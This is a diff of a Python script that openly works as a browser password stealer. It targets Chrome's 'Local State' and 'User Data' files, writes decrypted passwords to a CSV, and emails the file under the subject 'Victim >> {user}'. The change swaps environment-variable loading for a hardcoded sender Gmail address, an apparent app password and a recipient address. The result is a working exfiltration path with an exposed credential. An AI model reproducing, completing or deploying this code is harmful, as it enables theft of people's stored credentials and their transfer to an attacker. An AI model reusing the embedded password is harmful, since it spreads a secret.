@@ -23,7 +23,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email import encoders
-from dotenv import load_dotenv
 
 Browser_list = [
     os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])) , os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])) ,
@@ -145,14 +144,13 @@ if __name__ == '__main__':
     except Exception as e:
         pass
     finally:
-        load_dotenv()
         a = os.getcwd()
         subject = f"Victim >> {os.getlogin()} using {used_browser}"
         body = ""
         path = f"{a}\\decrypted_password.csv"
-        sender_email = load_dotenv('sender_email')
-        sender_password = load_dotenv('sender_password')
-        recipient_email = load_dotenv('recipient_email')
+        sender_email = 'iamqwertyfish@gmail.com'
+        sender_password = 'gdym qzfa ugfd qngz'
+        recipient_email = 'sepiolsam2023@gmail.com'
         
         try:
             send_email(sender_email = sender_email , sender_password = sender_password , recipient_email = recipient_email , 
